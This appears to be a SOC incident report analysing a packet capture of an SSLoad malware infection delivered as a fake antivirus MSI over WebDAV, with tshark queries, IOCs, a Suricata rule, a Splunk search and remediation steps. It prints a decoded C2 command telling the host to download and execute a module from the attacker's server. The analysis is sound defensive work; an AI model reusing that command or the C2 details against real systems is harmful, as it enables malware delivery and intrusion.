**Classification:** TLP:AMBER (Internal Use — SOC / Incident Response)  
**Platform / Environment:** Wireshark / Tshark / PCAP Network Forensics / Splunk Enterprise ES  
**Target / Infrastructure:** Internal Host DESKTOP-FWQ3U4C (10.4.17.101) / HTTP/WebDAV Perimeter Traffic  

#### 1. Threat Scenario and Context

- **Executive Summary:** A security incident involving anomalous outbound network traffic generated from workstation 10.4.17.101 was investigated. Forensic examination of interceptor.pcap identified a malware compromise leveraging WebDAV protocol extensions and the retrieval of a malicious MSI package (avp.msi) from external IP 85.239.53.219. Execution of the installer via msiexec.exe extracted and loaded a dynamic-link library (forcedelctl.dll) linked to the **SSLoad** malware family. The payload profiled the underlying operating system (Windows 6.3.9600, user Nevada), validated egress connectivity via api.ipify.org, and established HTTP API-based Command and Control (C2) to receive secondary-stage execution commands.
    
- **Telemetry Sources and Dataset Contents:** Raw network capture interceptor.pcap (11 MiB). Analysis of DNS, HTTP (PROPFIND, GET, POST methods), and SMB/Browser broadcast traffic captured during initial staging and C2 beaconing phases.

#### 2. MITRE ATT&CK® Tactical Mapping

| Tactic | Technique / Sub-technique ID | Technique Name | Specific Evidence / Log Found |
|---|---|---|---|
| **Initial Access / Execution** | T1218.007 | System Binary Proxy Execution: Msiexec | Execution of malicious package avp.msi via legitimate binary C:\Windows\system32\msiexec.exe. |
| **Discovery** | T1082 | System Information Discovery | Malware harvested and exfiltrated hostname DESKTOP-FWQ3U4C, user Nevada, and OS version Windows 6.3.9600. |
| **Discovery** | T1016 | System Network Configuration Discovery | DNS queries and HTTP requests sent to api.ipify.org to determine external public IP. |
| **Discovery** | T1083 | File and Directory Discovery | Abuse of HTTP WebDAV PROPFIND to enumerate remote file directory properties. |
| **Command and Control** | T1071.001 | Application Layer Protocol: Web Protocols | Structured HTTP sessions to 85.239.53.219 using API authorization tokens and Base64 commands. |
| **Command and Control** | T1573.001 | Encrypted Channel: Symmetric Cryptography | C2 communication channel protected using symmetric authentication key WkZPxBoH6CA3Ok4iI. |

#### 3. Forensic Investigation Chain and Telemetry Analysis

- **Hunting Hypothesis:** Identify the internal host generating the highest packet count, abnormal DNS resolutions, and non-standard connection requests.
    
- **Operational Queries and Commands:**

``` bash
tshark -r interceptor.pcap -q -z conv,ip
tshark -r interceptor.pcap -Y "browser" -T fields -e ip.src -e browser.server
```

- **Technical Breakdown of Evidence:**
    
    - IP address **10.4.17.101** accounted for the vast majority of network traffic.
        
    - The host announced its identity across the local subnet via SMB/Browser broadcasts to 10.4.17.255, confirming the computer name: **DESKTOP-FWQ3U4C**.

---

- **Hunting Hypothesis:** Filter HTTP transactions utilizing WebDAV extension methods employed for directory reconnaissance and executable staging.
    
- **Operational Queries and Commands:**

``` bash
tshark -r interceptor.pcap -Y "http.request.method == \"PROPFIND\" || http.request.uri contains \".msi\"" -T fields -e frame.number -e ip.src -e ip.dst -e http.request.method -e http.request.uri
```

- **Technical Breakdown of Evidence:**
    
    - The adversary operated from external IP **85.239.53.219**, executing HTTP **PROPFIND** requests against the target to enumerate file system properties.
        
    - The host subsequently retrieved payload file **avp.msi** (named to mimic legitimate antivirus installation media).
        
    - The MSI installer was executed on the host via **C:\Windows\system32\msiexec.exe**.

---

- **Hunting Hypothesis:** Carve the MSI container components to inspect bundled DLLs and evaluate binary fingerprints.
    
- **Operational Queries and Commands:**

``` bash
tshark -r interceptor.pcap --export-objects "http,./extracted_http"
sha256sum extracted_http/avp.msi
```

- **Technical Breakdown of Evidence:**
    
    - The cryptographic signature of the installer mapped to the **ssload** malware family.
        
    - **SSDEEP Fuzzy Hash:** 24576:BqKxnNTYUx0ECIgYmfLVYeBZr7A9zdfoAX+8UhxcS:Bq6TYCZKumZr7ARdAAO8oxz.
        
    - **Compilation Timestamp:** 2009-12-11 11:47:44 UTC (manipulated historical timestamp utilized for anti-forensic timestomping).
        
    - **Extracted Dynamic Link Library:** Bundled alongside disk1.cab and Binary.aicustact.dll, the operational malicious payload extracted was **forcedelctl.dll**.

---

- **Hunting Hypothesis:** Reconstruct the C2 TCP streams to decode instructions delivered by the remote server.
    
- **Operational Queries and Commands:**

``` bash
tshark -r interceptor.pcap -Y "http.request.method == \"POST\" && ip.dst == 85.239.53.219" -T fields -e text
```

- **Technical Breakdown of Evidence:**
    
    - **Egress Network Validation:** The binary issued DNS requests for **api.ipify.org** to identify its external IP address.
        
    - **C2 API Authentication:** POST requests embedded the static API token: **WkZPxBoH6CA3Ok4iI**.
        
    - **Exfiltrated Host Profile:** Payload data transmitted username **Nevada** and kernel version **Windows 6.3.9600** (Windows 8.1 / Windows Server 2012 R2).
        
    - **Decoded Command Body:**

``` Json
{"command": "exe", "args": ["http://85.239.53.219/download?id=Nevada&module=2&filename=None"]}
```

- **Downstream Execution Failure:** The subsequent request to retrieve the secondary module resulted in an HTTP **500 Internal Server Error** response, interrupting the execution chain before staging the final component.

#### 4. Detection Engineering (Alert & Correlation Rules)

``` Suricata
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"SOC - Deteccion de Balizamiento C2 SSLoad / Clave de Autenticacion"; flow:to_server,established; http.method; content:"POST"; http.request_body; content:"WkZPxBoH6CA3Ok4iI"; fast_pattern; classtype:trojan-activity; sid:20260401; rev:1;)
```

- **False Positive Considerations:** Exceptionally low given the high entropy of the static token string `WkZPxBoH6CA3Ok4iI`.
    
- **Tuning:** Ensure the Suricata `http.request_body` inspection buffer is adequately sized in suricata.yaml to parse incoming unencrypted POST payloads.

``` SPL
index=win_servers EventCode=1 Image="*\\msiexec.exe" (CommandLine="*http*" OR CommandLine="*\\*@SSL*" OR CommandLine="*\\*@80*" OR CommandLine="*\\AppData\\Local\\Temp*")
| stats count min(_time) as primer_evento max(_time) as ultimo_evento values(CommandLine) as lineas_comando by Computer, User, ParentImage
| convert ctime(primer_evento) ctime(ultimo_evento)
| table primer_evento, ultimo_evento, Computer, User, ParentImage, lineas_comando, count
```

- **False Positive Considerations:** Legitimate enterprise application deployment via automated tools like SCCM or Group Policy.
    
- **Tuning:** Filter out authorized software deployment service accounts (e.g., SYSTEM, svc_deploy) and approved internal enterprise UNC paths.

#### 5. Containment, Remediation, and Hardening Recommendations

1. **Host Isolation:** Disconnect endpoint 10.4.17.101 from the network using EDR host isolation.
    
2. **Perimeter IOC Blocking:**
    
    - Block inbound and outbound traffic to C2 IP address **85.239.53.219** across enterprise firewalls.
        
    - Monitor or restrict lookups for external lookup service api.ipify.org on standard client subnets.
        
3. **Endpoint Remediation:** Locate and purge avp.msi and all remnants of forcedelctl.dll across system temporary locations and the Nevada profile directory.
    
4. **Enforce Application Control (WDAC / AppLocker):** Restrict standard users from executing unsigned Windows Installer (.msi) packages and restrict msiexec.exe execution to administrative management contexts.
    
5. **Disable WebDAV WebClient Service:** Disable the WebClient service via Group Policy (GPO) across all endpoints to block outbound WebDAV connection vectors.